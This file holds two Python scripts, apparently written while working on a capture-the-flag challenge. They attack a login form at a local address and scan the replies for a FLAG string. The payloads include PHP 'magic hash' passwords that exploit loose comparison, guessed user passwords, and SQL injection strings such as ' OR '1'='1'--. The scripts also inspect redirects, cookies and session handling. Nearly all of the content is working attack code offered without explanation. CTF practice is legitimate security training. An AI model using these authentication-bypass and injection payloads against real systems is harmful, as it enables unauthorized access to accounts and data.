import requests
import re

base_url = "http://127.0.0.1:33063/index.php"

session = requests.Session()

# First, check what happens with allow_redirects=False
print("[*] Testing with allow_redirects=False")
print("-" * 60)

test_payloads = [
    # PHP Magic Hashes - specific known strings that MD5/SHA to 0e...
    {"username": "homer", "password": "QNKCDZO"},           # md5("QNKCDZO") = 0e830400451993494058024219903391
    {"username": "homer", "password": "240610708"},         # md5("240610708") = 0e462097431906509019562988736854
    {"username": "homer", "password": "aabg7XSs"},          # md5("aabg7XSs") = 0e087386482136013740957780965295
    {"username": "homer", "password": "s878926199a"},       # md5("s878926199a") = 0e530993283642760988405668248024
    {"username": "homer", "password": "s155964671a"},       # another magic hash
    {"username": "homer", "password": "s214587387a"},       # another magic hash
    # Common Simpsons passwords
    {"username": "homer", "password": "donut"},
    {"username": "homer", "password": "duff"},
    {"username": "homer", "password": "marge"},
    {"username": "homer", "password": "springfield"},
    {"username": "homer", "password": "password"},
    {"username": "homer", "password": "123456"},
    # More SQLi variations
    {"username": "homer' OR '1'='1", "password": "anything"},
    {"username": "homer' OR 1=1--", "password": "anything"},
    {"username": "' OR '1'='1'--", "password": ""},
    {"username": "' OR 1=1--", "password": ""},
    # Try with admin user and SQLi
    {"username": "admin' OR 1=1--", "password": "anything"},
    # Try URL-encoded SQL injection in username
    {"username": "homer%27%20OR%20%271%27%3D%271", "password": "anything"},
]

for payload in test_payloads:
    resp = session.post(base_url, data=payload, allow_redirects=False)
    resp_text = resp.text if resp.status_code != 302 else ""
    
    cookies_set = dict(resp.cookies) if resp.cookies else {}
    
    # Check for redirect
    if resp.status_code in [301, 302, 303, 307, 308]:
        location = resp.headers.get('Location', 'N/A')
        print(f"\n[REDIRECT] {payload}")
        print(f"  Status: {resp.status_code} | Location: {location}")
        print(f"  Cookies: {cookies_set}")
    elif len(resp_text) != 3106:
        print(f"\n[DIFFERENT] {payload}")
        print(f"  Status: {resp.status_code} | Length: {len(resp_text)}B | Cookies: {cookies_set}")
        flags = re.findall(r'FLAG\{[^}]+\}', resp_text, re.I)
        if flags:
            print(f"  [!!!] FLAG FOUND: {flags}")
        print(f"  Response: {resp_text[:500]}")
    else:
        # Same as baseline - just note cookies
        if cookies_set:
            print(f"\n[COOKIES] {payload} | Cookies: {cookies_set}")

# Now try following redirects to see where they go
print("\n\n[*] Testing with allow_redirects=True and checking cookies/headers")
print("-" * 60)

key_payloads = [
    {"username": "homer", "password": "QNKCDZO"},
    {"username": "homer", "password": "240610708"},
    {"username": "' OR '1'='1'--", "password": "anything"},
    {"username": "homer", "password": "donut"},
    {"username": "homer", "password": "springfield"},
]

for payload in key_payloads:
    resp = session.post(base_url, data=payload, allow_redirects=True)
    cookies_set = dict(resp.cookies) if resp.cookies else {}
    resp_text = resp.text
    
    is_different = len(resp_text) != 3106
    print(f"\n{payload}")
    print(f"  Status: {resp.status_code} | Length: {len(resp_text)}B | Cookies: {cookies_set}")
    print(f"  Final URL: {resp.url}")
    print(f"  History: {[h.status_code for h in resp.history]}")
    
    if is_different:
        print(f"  [DIFFERENT RESPONSE]")
        flags = re.findall(r'FLAG\{[^}]+\}', resp_text, re.I)
        if flags:
            print(f"  [!!!] FLAG FOUND: {flags}")
        print(f"  Response: {resp_text[:1000]}")

# Also check GET request to see if there's something different
print("\n\n[*] GET request to index.php")
resp = session.get(base_url)
print(f"  Status: {resp.status_code} | Length: {len(resp.text)}B")
print(f"  Cookies: {dict(resp.cookies)}")

import requests
import re

base_url = "http://127.0.0.1:33063/index.php"

session = requests.Session()

# Let's examine the 302 responses in detail - headers, cookies, body
# Compare a known-bad login vs potentially valid ones

test_cases = [
    ("Bad credentials", {"username": "nonexistent_bad_user", "password": "wrongpass_xyz"}),
    ("homer/QNKCDZO", {"username": "homer", "password": "QNKCDZO"}),
    ("homer/240610708", {"username": "homer", "password": "240610708"}),
    ("homer/aabg7XSs", {"username": "homer", "password": "aabg7XSs"}),
    ("homer/donut", {"username": "homer", "password": "donut"}),
    ("homer/springfield", {"username": "homer", "password": "springfield"}),
    ("SQLi OR 1=1", {"username": "' OR '1'='1'--", "password": "anything"}),
]

print("[*] Detailed 302 response analysis")
print("=" * 80)

for label, payload in test_cases:
    resp = session.post(base_url, data=payload, allow_redirects=False)
    print(f"\n[{label}]")
    print(f"  Status: {resp.status_code}")
    print(f"  Headers:")
    for k, v in resp.headers.items():
        print(f"    {k}: {v}")
    print(f"  Cookies: {dict(resp.cookies)}")
    print(f"  Body length: {len(resp.text)}")
    if resp.text:
        print(f"  Body: {resp.text[:300]}")
    
    # Now follow the redirect manually with cookies
    if resp.status_code == 302:
        location = resp.headers.get('Location', '')
        redirect_url = base_url  # Location is relative "index.php"
        get_resp = session.get(redirect_url, allow_redirects=False)
        print(f"  -> GET after redirect: Status={get_resp.status_code} | Length={len(get_resp.text)} | Cookies={dict(get_resp.cookies)}")
        if get_resp.text and len(get_resp.text) != 3106:
            print(f"  -> GET response: {get_resp.text[:500]}")

# Also check if PHPSESSID is needed
print("\n\n[*] Testing with explicit cookie handling")
print("-" * 60)

# Start fresh session
s = requests.Session()

# First GET to get any session cookie
r = s.get(base_url)
print(f"Initial GET: Status={r.status_code} | Cookies={dict(s.cookies)} | Set-Cookie headers:")
for h in r.headers.get('Set-Cookie', '').split(','):
    print(f"  {h.strip()}")

# Now POST with the session
for label, payload in test_cases:
    resp = s.post(base_url, data=payload, allow_redirects=True)
    print(f"\n[{label}] (with session)")
    print(f"  Status: {resp.status_code} | Length: {len(resp.text)}B | URL: {resp.url}")
    print(f"  Session cookies: {dict(s.cookies)}")
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    if flags:
        print(f"  [!!!] FLAG FOUND: {flags}")
    if len(resp.text) != 3106:
        print(f"  [DIFFERENT RESPONSE]: {resp.text[:1000]}")

